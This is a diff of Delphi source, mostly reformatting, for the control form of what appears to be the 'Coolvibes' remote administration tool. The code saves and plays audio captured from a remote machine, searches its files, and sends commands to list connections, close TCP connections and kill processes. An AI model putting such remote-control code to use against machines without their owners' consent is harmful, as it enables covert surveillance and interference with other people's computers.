-    wFormato : TWaveFormatEx;
+  RiffSize: Integer;
+  Fmt_Size: Integer;
+  WaveBuffLen: Integer;
+  wFormato: TWaveFormatEx;
 const
   RiffStr = 'RIFF';
   WaveStr = 'WAVE';
@@ -4700,153 +4739,151 @@ const
   DataStr = 'data';
 begin
   wFormato.WFormatTag := WAVE_FORMAT_PCM;
-  wFormato.NChannels:=nChannels; //1=mono 2= stereo
-  wFormato.wBitsPerSample:=wBitsPerSample; //8,16
-  wFormato.NSamplesPerSec:=NSamplesPerSec;//HZ
-  wFormato.NBlockAlign:=(wFormato.nChannels * wFormato.wBitsPerSample) div 8;
-  wFormato.NAvgBytesPerSec:=wFormato.NSamplesPerSec*wFormato.NBlockAlign;
-  wFormato.cbSize:= 0;
+  wFormato.NChannels := nChannels; //1=mono 2= stereo
+  wFormato.wBitsPerSample := wBitsPerSample; //8,16
+  wFormato.NSamplesPerSec := NSamplesPerSec; //HZ
+  wFormato.NBlockAlign := (wFormato.nChannels * wFormato.wBitsPerSample) div 8;
+  wFormato.NAvgBytesPerSec := wFormato.NSamplesPerSec * wFormato.NBlockAlign;
+  wFormato.cbSize := 0;
 
-  WaveBuffLen := length(b);
-  RiffSize :=  20 + SizeOf(wFormato) + WaveBuffLen;
+  WaveBuffLen := Length(b);
+  RiffSize := 20 + SizeOf(wFormato) + WaveBuffLen;
   Fmt_Size := SizeOf(wFormato);
   with ms do
-  begin
-    //escribimos la cabecera del archivo .wav
-    Write(RiffStr[1], Length(RiffStr));
-    Write(RiffSize, SizeOf(integer));
-    Write(WaveStr[1], Length(WaveStr));
-    Write(Fmt_Str[1], Length(Fmt_Str));
-    Write(Fmt_Size, SizeOf(integer));
-    Write(wFormato, SizeOf(TWaveFormatEx));
-    Write(DataStr[1], Length(DataStr));
-    
-    Write(WaveBuffLen, sizeof(integer));
+    begin
+      //escribimos la cabecera del archivo .wav
+      Write(RiffStr[1], Length(RiffStr));
+      Write(RiffSize, SizeOf(Integer));
+      Write(WaveStr[1], Length(WaveStr));
+      Write(Fmt_Str[1], Length(Fmt_Str));
+      Write(Fmt_Size, SizeOf(Integer));
+      Write(wFormato, SizeOf(TWaveFormatEx));
+      Write(DataStr[1], Length(DataStr));
 
-    //Esribimos la onda
-    Write(b[1], length(b));
-  end;
+      Write(WaveBuffLen, SizeOf(Integer));
+
+      //Esribimos la onda
+      Write(b[1], Length(b));
+    end;
 
 end;
 
 procedure TFormControl.SpinEditAudioChange(Sender: TObject);
 var
-  size, i: integer;
+  Size, i: Integer;
 begin
-  for i := 0 to ListViewAudioFormato.items.count-1 do
-    if ListViewAudioFormato.items[i].checked then
-      ListViewAudioFormato.items[i].selected := true;
-      
+  for i := 0 to ListViewAudioFormato.Items.Count - 1 do
+    if ListViewAudioFormato.Items[i].Checked then
+      ListViewAudioFormato.Items[i].selected := True;
+
   if ListviewAudioFormato.selected <> nil then
-  begin
-
-    Size := strtoint(copy(listviewAudioFormato.selected.caption , 1, pos(' ',listviewAudioFormato.selected.caption)-1));
-
-    if listviewAudioFormato.selected.subitems[1] = '16' then
-      Size := Size * 2;
-
-    if listviewAudioFormato.selected.subitems[0] = 'Stereo' then
     begin
-      Size := Size * 2;
-    end;
 
-      Size := Size * strtointdef(SpinEditAudio.text,1);
-    LabelLengthAudio.caption := _('Tamaño')+': '+ inttostr(size div 1024)+ ' KB';
-  end;
+      Size := StrToInt(Copy(listviewAudioFormato.selected.Caption, 1, Pos(' ', listviewAudioFormato.selected.Caption) - 1));
+
+      if listviewAudioFormato.selected.subitems[1] = '16' then
+        Size := Size * 2;
+
+      if listviewAudioFormato.selected.subitems[0] = 'Stereo' then
+        begin
+          Size := Size * 2;
+        end;
+
+      Size := Size * StrToIntDef(SpinEditAudio.Text, 1);
+      LabelLengthAudio.Caption := _('Tamaño') + ': ' + IntToStr(Size div 1024) + ' KB';
+    end;
 end;
 
 procedure TFormControl.Eliminar2Click(Sender: TObject);
 var
-  tmpitem : Tlistitem;
+  tmpitem: Tlistitem;
 begin
-     mslistviewitem := ListViewAudio.Selected;
+  mslistviewitem := ListViewAudio.Selected;
 
-      while Assigned(mslistviewitem) do
-      begin
-        Freemem(mslistviewitem.data);
-        tmpitem := mslistviewitem;
-        mslistviewitem := ListViewAudio.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-        tmpitem.delete;
-      end;
+  while Assigned(mslistviewitem) do
+    begin
+      Freemem(mslistviewitem.data);
+      tmpitem := mslistviewitem;
+      mslistviewitem := ListViewAudio.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+      tmpitem.Delete;
+    end;
 end;
 
 procedure TFormControl.Guardar1Click(Sender: TObject);
 var
   MS: TMemoryStream;
-  Buffer : string;
-  Total : string;
+  Buffer: string;
+  Total: string;
   Tempstr1, tempstr2, tempstr3, tmpstr: string;
-  Ruta : string;
+  Ruta: string;
 begin
-  DlgGuardar.Title      := _('Guardar Audio ::Coolvibes::');
+  DlgGuardar.Title := _('Guardar Audio ::Coolvibes::');
   DlgGuardar.InitialDir := GetCurrentDir();
-  DlgGuardar.Filter     := _('Audio')+' .wav|*.wav';
+  DlgGuardar.Filter := _('Audio') + ' .wav|*.wav';
   DlgGuardar.DefaultExt := 'wav';
   if DlgGuardar.Execute then
-  begin
+    begin
       mslistviewitem := ListViewAudio.Selected;
       while Assigned(mslistviewitem) do
-      begin
-        setlength(Buffer, strtoint(mslistviewitem.subitems.strings[4]));
-        movememory(pointer(Buffer), mslistviewitem.data, strtoint(mslistviewitem.subitems.strings[4]));
+        begin
+          setlength(Buffer, StrToInt(mslistviewitem.subitems.Strings[4]));
+          movememory(Pointer(Buffer), mslistviewitem.data, StrToInt(mslistviewitem.subitems.Strings[4]));
 
+          //Agregamos solamente la onda, ignorando los headers
+          Total := Total + Copy(buffer, 1 + Length(buffer) - StrToInt(mslistviewitem.subitems[0]), StrToInt(mslistviewitem.subitems[0]));
 
-        //Agregamos solamente la onda, ignorando los headers
-        Total := Total + copy(buffer,1+length(buffer)-strtoint(mslistviewitem.subitems[0]),strtoint(mslistviewitem.subitems[0]));
+          TmpStr := mslistviewitem.subitems[3];
+          TempStr1 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1); //HZ
+          Delete(TmpStr, 1, Pos('-', TmpStr));
+          TempStr2 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1); //Canal
+          Delete(TmpStr, 1, Pos('-', TmpStr));
+          TempStr3 := TmpStr; //Bits
 
-        TmpStr := mslistviewitem.subitems[3];
-        TempStr1 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //HZ
-        Delete(TmpStr, 1, pos('-', TmpStr));
-        TempStr2 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //Canal
-        Delete(TmpStr, 1, pos('-', TmpStr));
-        TempStr3 := TmpStr;                                    //Bits
-
-        mslistviewitem := ListViewAudio.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      end;
-       //Si el grupo de sonidos que queremos guardar son de distinta frecuencia
+          mslistviewitem := ListViewAudio.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+        end;
+      //Si el grupo de sonidos que queremos guardar son de distinta frecuencia
       try
-        MS := TMemoryStream.create;
-        InitWavFile(MS, strtoint(TempStr2), strtoint(TempStr1), strtoint(TempStr3), total);
+        MS := TMemoryStream.Create;
+        InitWavFile(MS, StrToInt(TempStr2), StrToInt(TempStr1), StrToInt(TempStr3), total);
         Ms.savetofile(DlgGuardar.FileName);
       finally
-        ms.free;
+        ms.Free;
       end;
-      Estado(_('Audio guardado con éxito:')+' '+ DlgGuardar.FileName);
+      Estado(_('Audio guardado con éxito:') + ' ' + DlgGuardar.FileName);
     end;
 end;
 
 procedure TFormControl.Reproducir1Click(Sender: TObject);
 var
   MS: TMemoryStream;
-  Buffer : string;
-  Total : string;
+  Buffer: string;
+  Total: string;
   Tempstr1, tempstr2, tempstr3, tmpstr: string;
-  Ruta : string;
+  Ruta: string;
 begin
-      mslistviewitem := ListViewAudio.Selected;
-      while Assigned(mslistviewitem) do
-      begin
-        setlength(Buffer, strtoint(mslistviewitem.subitems.strings[4]));
-        movememory(pointer(Buffer), mslistviewitem.data, strtoint(mslistviewitem.subitems.strings[4]));
+  mslistviewitem := ListViewAudio.Selected;
+  while Assigned(mslistviewitem) do
+    begin
+      setlength(Buffer, StrToInt(mslistviewitem.subitems.Strings[4]));
+      movememory(Pointer(Buffer), mslistviewitem.data, StrToInt(mslistviewitem.subitems.Strings[4]));
 
+      //Agregamos solamente la onda, ignorando los headers
+      Total := Total + Copy(buffer, 1 + Length(buffer) - StrToInt(mslistviewitem.subitems[0]), StrToInt(mslistviewitem.subitems[0]));
 
-        //Agregamos solamente la onda, ignorando los headers
-        Total := Total + copy(buffer,1+length(buffer)-strtoint(mslistviewitem.subitems[0]),strtoint(mslistviewitem.subitems[0]));
+      TmpStr := mslistviewitem.subitems[3];
+      TempStr1 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1); //HZ
+      Delete(TmpStr, 1, Pos('-', TmpStr));
+      TempStr2 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1); //Canal
+      Delete(TmpStr, 1, Pos('-', TmpStr));
+      TempStr3 := TmpStr; //Bits
 
-        TmpStr := mslistviewitem.subitems[3];
-        TempStr1 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //HZ
-        Delete(TmpStr, 1, pos('-', TmpStr));
-        TempStr2 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //Canal
-        Delete(TmpStr, 1, pos('-', TmpStr));
-        TempStr3 := TmpStr;                                    //Bits
+      mslistviewitem := ListViewAudio.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+    end;
+  //Si el grupo de sonidos que queremos guardar son de distinta frecuencia
 
-        mslistviewitem := ListViewAudio.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      end;
-       //Si el grupo de sonidos que queremos guardar son de distinta frecuencia
-
-        MS := TMemoryStream.create;
-        InitWavFile(MS, strtoint(TempStr2), strtoint(TempStr1), strtoint(TempStr3), total);
-        sndPlaySound(Ms.memory, SND_MEMORY or SND_ASYNC);
+  MS := TMemoryStream.Create;
+  InitWavFile(MS, StrToInt(TempStr2), StrToInt(TempStr1), StrToInt(TempStr3), total);
+  sndPlaySound(Ms.memory, SND_MEMORY or SND_ASYNC);
 end;
 
 procedure TFormControl.ListViewAudioFormatoClick(Sender: TObject);
@@ -4856,158 +4893,159 @@ end;
 
 procedure TFormControl.SpeedButton1Click(Sender: TObject);
 var
-  itmnum : integer;
-  i      : integer;
+  itmnum: Integer;
+  i: Integer;
 begin
   itmnum := ListviewBuscar.Items.Count;
 
-  if SpeedbuttonBuscar.caption = _('Comenzar') then
-  begin
-    ListviewBuscar.Items.Count := 0;
-    listviewbuscar.repaint;
-    for i := 0 to itmnum-1 do
+  if SpeedbuttonBuscar.Caption = _('Comenzar') then
     begin
-      searchitems[i].nombre := '';
-      searchitems[i].tamanio := '';
-      searchitems[i].tipo := '';
-      searchitems[i].atributos := '';
-      searchitems[i].Fechamodify := 0;
-      searchitems[i].tamanioreal := 0;
+      ListviewBuscar.Items.Count := 0;
+      listviewbuscar.repaint;
+      for i := 0 to itmnum - 1 do
+        begin
+          searchitems[i].nombre := '';
+          searchitems[i].tamanio := '';
+          searchitems[i].tipo := '';
+          searchitems[i].atributos := '';
+          searchitems[i].Fechamodify := 0;
+          searchitems[i].tamanioreal := 0;
+        end;
     end;
-  end;
-  LabelNumeroEncontrados.caption := '';
+  LabelNumeroEncontrados.Caption := '';
 end;
 
 procedure TFormControl.ListViewBuscarData(Sender: TObject;
   Item: TListItem);
 var
-  index : integer;
+  Index: Integer;
 begin
 
   if reversed then
-    index := encontrados-item.index-1
+    Index := encontrados - item.Index - 1
   else
-    index := item.index;
+    Index := item.Index;
 
-  if not((item.index >= encontrados) or (item.index < 0)) then
-  begin
-    Item.Caption := extractfilename(SearchItems[index].nombre);
-    try
-    item.ImageIndex := Iconnum(item.caption, true);
-    except
-    end;
-    Item.SubItems.Add(SearchItems[index].nombre);
-    Item.SubItems.Add(SearchItems[index].tamanio);
-    Item.SubItems.Add(SearchItems[index].tipo);
+  if not ((item.Index >= encontrados) or (item.Index < 0)) then
+    begin
+      Item.Caption := extractfilename(SearchItems[Index].nombre);
+      try
+        item.ImageIndex := Iconnum(item.Caption, True);
+      except
+      end;
+      Item.SubItems.Add(SearchItems[Index].nombre);
+      Item.SubItems.Add(SearchItems[Index].tamanio);
+      Item.SubItems.Add(SearchItems[Index].tipo);
 
-    Item.SubItems.Add(SearchItems[index].atributos);
-    Item.SubItems.Add(DateToStr(FileDateToDateTime(SearchItems[index].Fechamodify))
-    + ' ' +
-    TimeToStr(FileDateToDateTime(SearchItems[index].Fechamodify)));
-    Item.SubItems.Add(inttostr(SearchItems[index].tamanioreal));
-  end
+      Item.SubItems.Add(SearchItems[Index].atributos);
+      Item.SubItems.Add(DateToStr(FileDateToDateTime(SearchItems[Index].Fechamodify))
+        + ' ' +
+        TimeToStr(FileDateToDateTime(SearchItems[Index].Fechamodify)));
+      Item.SubItems.Add(IntToStr(SearchItems[Index].tamanioreal));
+    end
   else
-    item.caption := 'error';
+    item.Caption := 'error';
 end;
 
 procedure TFormControl.TimerCuentaEncontradosTimer(Sender: TObject);
 begin
-  TimerCuentaencontrados.enabled := TabSheetBuscar.highlighted;
+  TimerCuentaencontrados.Enabled := TabSheetBuscar.highlighted;
   ListviewBuscar.Items.Count := Encontrados;
-  LabelNumeroEncontrados.Caption := _('Encontrados: ')+inttostr(Encontrados);
+  LabelNumeroEncontrados.Caption := _('Encontrados: ') + IntToStr(Encontrados);
 end;
 
 procedure TFormControl.LabelVelocidadClick(Sender: TObject);
 begin
-  messageboxw(0,pwidechar(_('Velocidad')),PWchar(_('Cuanta más velocidad más CPU se consumirá en la maquina remota. Si no tienes prisa marca lenta')),0);
+  messageboxw(0, pwidechar(_('Velocidad')), PWchar(_('Cuanta más velocidad más CPU se consumirá en la maquina remota. Si no tienes prisa marca lenta')), 0);
 end;
 
 procedure TFormControl.SpeedButton2Click(Sender: TObject);
 begin
-  ParaDeListar := true;
+  ParaDeListar := True;
 end;
-
-
 
 procedure TFormControl.ListViewBuscarColumnClick(Sender: TObject;
   Column: TListColumn);
 var
-  i : Integer;
-  tmpstr : string;
-  procedure QuickSort(var A: array of TSearchItem; iLo, iHi: Integer);
- var
-   Lo, Hi: Integer;
-   Pivot : string;
-   T : Tsearchitem;
- begin
-   Lo := iLo;
-   Hi := iHi;
-   Pivot := A[(Lo + Hi) div 2].sortdata;
-   repeat
-      while strIcomp(pchar(A[Lo].sortdata),pchar(pivot))<0 do Inc(Lo);
-      while StrIComp(pchar(pivot),pchar(A[Hi].sortdata))<0 do Dec(Hi);
-     if Lo <= Hi then
-     begin
-       T := A[Lo];
-       A[Lo] := A[Hi];
-       A[Hi] := T;
-       Inc(Lo) ;
-       Dec(Hi) ;
-     end;
-   until Lo > Hi;
-   if Hi > iLo then QuickSort(A, iLo, Hi) ;
-   if Lo < iHi then QuickSort(A, Lo, iHi) ;
- end;
- 
-begin
-  if column.index = 4 then exit;
+  i: Integer;
+  tmpstr: string;
 
-  if ColumnaOrdenada = column.index then
-    Reversed := not reversed
-  else
+  procedure QuickSort(var A: array of TSearchItem; iLo, iHi: Integer);
+  var
+    Lo, Hi: Integer;
+    Pivot: string;
+    T: Tsearchitem;
   begin
-    if column.index = 2 then      //tamaño
-    begin
-      for i := 0 to encontrados do
-      begin
-        tmpstr := inttostr(SearchItems[i].TamanioReal);
-        while length(tmpstr) < 12 do  //Para tratarlas como strings
-          Tmpstr := '.'+tmpstr; 
-        SearchItems[i].sortdata := tmpstr;
-      end;
-    end
-    else if column.index = 5 then //tamaño
-    begin
-      for i := 0 to encontrados do
-      begin
-        tmpstr := inttostr(round(SearchItems[i].FechaModify));
-        while length(tmpstr) < 12 do  //Para tratarlas como strings
-          Tmpstr := '.'+tmpstr; 
-        SearchItems[i].sortdata := tmpstr;
-      end;
-    end
-    else if column.index = 1 then
-    begin
-      for i := 0 to encontrados do
-        SearchItems[i].sortdata := SearchItems[i].Nombre;
-    end
-    else if column.index = 0 then
-    begin
-      for i := 0 to encontrados do
-        SearchItems[i].sortdata := extractfilename(SearchItems[i].Nombre);
-    end
-    else if column.index = 3 then
-    begin
-      for i := 0 to encontrados do
-        SearchItems[i].sortdata := extractfilename(SearchItems[i].tipo);
-    end;
-    
-    Quicksort(SearchItems, 0, encontrados-1);
-     for i := 0 to encontrados do
-      SearchItems[i].sortdata := '';
+    Lo := iLo;
+    Hi := iHi;
+    Pivot := A[(Lo + Hi) div 2].sortdata;
+    repeat
+      while strIcomp(PChar(A[Lo].sortdata), PChar(pivot)) < 0 do
+        Inc(Lo);
+      while StrIComp(PChar(pivot), PChar(A[Hi].sortdata)) < 0 do
+        Dec(Hi);
+      if Lo <= Hi then
+        begin
+          T := A[Lo];
+          A[Lo] := A[Hi];
+          A[Hi] := T;
+          Inc(Lo);
+          Dec(Hi);
+        end;
+    until Lo > Hi;
+    if Hi > iLo then QuickSort(A, iLo, Hi);
+    if Lo < iHi then QuickSort(A, Lo, iHi);
   end;
 
-  ColumnaOrdenada := column.index;
+begin
+  if column.Index = 4 then Exit;
+
+  if ColumnaOrdenada = column.Index then
+    Reversed := not reversed
+  else
+    begin
+      if column.Index = 2 then //tamaño
+        begin
+          for i := 0 to encontrados do
+            begin
+              tmpstr := IntToStr(SearchItems[i].TamanioReal);
+              while Length(tmpstr) < 12 do //Para tratarlas como strings
+                Tmpstr := '.' + tmpstr;
+              SearchItems[i].sortdata := tmpstr;
+            end;
+        end
+      else if column.Index = 5 then //tamaño
+        begin
+          for i := 0 to encontrados do
+            begin
+              tmpstr := IntToStr(round(SearchItems[i].FechaModify));
+              while Length(tmpstr) < 12 do //Para tratarlas como strings
+                Tmpstr := '.' + tmpstr;
+              SearchItems[i].sortdata := tmpstr;
+            end;
+        end
+      else if column.Index = 1 then
+        begin
+          for i := 0 to encontrados do
+            SearchItems[i].sortdata := SearchItems[i].Nombre;
+        end
+      else if column.Index = 0 then
+        begin
+          for i := 0 to encontrados do
+            SearchItems[i].sortdata := extractfilename(SearchItems[i].Nombre);
+        end
+      else if column.Index = 3 then
+        begin
+          for i := 0 to encontrados do
+            SearchItems[i].sortdata := extractfilename(SearchItems[i].tipo);
+        end;
+
+      Quicksort(SearchItems, 0, encontrados - 1);
+      for i := 0 to encontrados do
+        SearchItems[i].sortdata := '';
+    end;
+
+  ColumnaOrdenada := column.Index;
   listviewbuscar.repaint;
 end;
 
@@ -5015,34 +5053,34 @@ procedure TFormControl.CreateParams(var Params: TCreateParams);
 begin
   inherited CreateParams(Params);
   if FormOpciones.CheckBoxCCIndependiente.Checked then
-  begin
-    Params.WndParent := GetDesktopWindow();
-    Params.exStyle := Params.exStyle or WS_EX_APPWINDOW;
-  end;
+    begin
+      Params.WndParent := GetDesktopWindow();
+      Params.exStyle := Params.exStyle or WS_EX_APPWINDOW;
+    end;
 end;
 
 procedure TFormControl.FormShow(Sender: TObject);
 begin
   if PrimeraVezQueMeMuestro then
-  begin
-    PrimeraVezQueMeMuestro := false;
-    CargarIconos(true);
-  end;
+    begin
+      PrimeraVezQueMeMuestro := False;
+      CargarIconos(True);
+    end;
 end;
 
 procedure TFormControl.BtnRefrescarPuertosClick(Sender: TObject);
 begin
-  if not BtnRefrescarPuertos.Enabled then exit;
-  BtnRefrescarPuertos.Enabled := false;
-  ListviewPuertos.enabled := false;
-  CheckBoxPuertos.enabled := false;
+  if not BtnRefrescarPuertos.Enabled then Exit;
+  BtnRefrescarPuertos.Enabled := False;
+  ListviewPuertos.Enabled := False;
+  CheckBoxPuertos.Enabled := False;
   if Servidor.Connection.Connected then
-  begin
-    if CheckBoxPuertos.Checked then
-      Servidor.Connection.Writeln('TCPUDP|TRUE')
-    else
-      Servidor.Connection.Writeln('TCPUDP|FALSE');
-  end
+    begin
+      if CheckBoxPuertos.Checked then
+        Servidor.Connection.Writeln('TCPUDP|TRUE')
+      else
+        Servidor.Connection.Writeln('TCPUDP|FALSE');
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 
@@ -5053,25 +5091,25 @@ procedure TFormControl.ListViewPuertosCompare(Sender: TObject; Item1,
 var
   Str1, Str2: string;
 begin
-  if Columna = 0 then  //Si Columna = 0 usar Item.Caption
-  begin
-    Str1 := Item1.Caption;
-    Str2 := Item2.Caption;
-  end
+  if Columna = 0 then //Si Columna = 0 usar Item.Caption
+    begin
+      Str1 := Item1.Caption;
+      Str2 := Item2.Caption;
+    end
   else
-  begin       //Si Columna > 0 usar Item.SubItems[Columna -1]
-    if Item1.SubItems.Count < Columna then
-      Str1 := ''
-    else
-      Str1 := Item1.SubItems[Columna - 1];
-    if Item2.SubItems.Count < Columna then
-      Str2 := ''
-    else
-      Str2 := Item2.SubItems[Columna - 1];
-  end;
-  if Columna in [0..5,7] then  //Son tratadas como cadenas
+    begin //Si Columna > 0 usar Item.SubItems[Columna -1]
+      if Item1.SubItems.Count < Columna then
+        Str1 := ''
+      else
+        Str1 := Item1.SubItems[Columna - 1];
+      if Item2.SubItems.Count < Columna then
+        Str2 := ''
+      else
+        Str2 := Item2.SubItems[Columna - 1];
+    end;
+  if Columna in [0..5, 7] then //Son tratadas como cadenas
     Compare := CompareText(Str1, Str2)
-  else  //Columna 6, PID
+  else //Columna 6, PID
     Compare := StrToIntDef(Str1, 0) - StrToIntDef(Str2, 0);
   //Si la columna ya fue ordenada anteriormente, invertir el orden
   if Columna = ColumnaOrdenada then
@@ -5081,56 +5119,56 @@ end;
 
 procedure TFormControl.CerrarConexin1Click(Sender: TObject);
 begin
- mslistviewitem := ListViewPuertos.Selected;
+  mslistviewitem := ListViewPuertos.Selected;
 
   if Servidor.Connection.Connected then
-  begin
-    if mslistviewitem = nil then
-      MessageDlg(_('Selecciona alguna conexión para cerrar'), mtWarning, [mbOK], 0)
-    else
     begin
+      if mslistviewitem = nil then
+        MessageDlg(_('Selecciona alguna conexión para cerrar'), mtWarning, [mbOK], 0)
+      else
+        begin
 
-      while Assigned(mslistviewitem) do
-      begin
-        if mslistviewitem.caption = 'TCP' then
-          Servidor.Connection.Writeln('TCPKILLCON|' +mslistviewitem.SubItems[0]+mslistviewitem.SubItems[1]+ mslistviewitem.SubItems[2]+mslistviewitem.SubItems[3]);
-        mslistviewitem := ListViewPuertos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      end;
-      BtnRefrescarPuertos.click;
+          while Assigned(mslistviewitem) do
+            begin
+              if mslistviewitem.Caption = 'TCP' then
+                Servidor.Connection.Writeln('TCPKILLCON|' + mslistviewitem.SubItems[0] + mslistviewitem.SubItems[1] + mslistviewitem.SubItems[2] + mslistviewitem.SubItems[3]);
+              mslistviewitem := ListViewPuertos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+            end;
+          BtnRefrescarPuertos.Click;
+        end
     end
-  end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.MatarProceso1Click(Sender: TObject);
 begin
- mslistviewitem := ListViewPuertos.Selected;
+  mslistviewitem := ListViewPuertos.Selected;
 
   if Servidor.Connection.Connected then
-  begin
-    if mslistviewitem = nil then
-      MessageDlg(_('Selecciona algún proceso para matar'), mtWarning, [mbOK], 0)
-    else
     begin
+      if mslistviewitem = nil then
+        MessageDlg(_('Selecciona algún proceso para matar'), mtWarning, [mbOK], 0)
+      else
+        begin
 
-      while Assigned(mslistviewitem) do
-      begin
-       Servidor.Connection.Writeln('KILLPROC|' + mslistviewitem.SubItems[5]);
-       mslistviewitem := ListViewPuertos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      end;
+          while Assigned(mslistviewitem) do
+            begin
+              Servidor.Connection.Writeln('KILLPROC|' + mslistviewitem.SubItems[5]);
+              mslistviewitem := ListViewPuertos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+            end;
 
+        end
     end
-  end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
-
 procedure TFormControl.TabPuertosShow(Sender: TObject);
 begin
-  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
-   BtnRefrescarPuertos.click;
+  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
+    BtnRefrescarPuertos.Click;
 end;
 
-end.//Fin del proyecto
+end. //Fin del proyecto
+
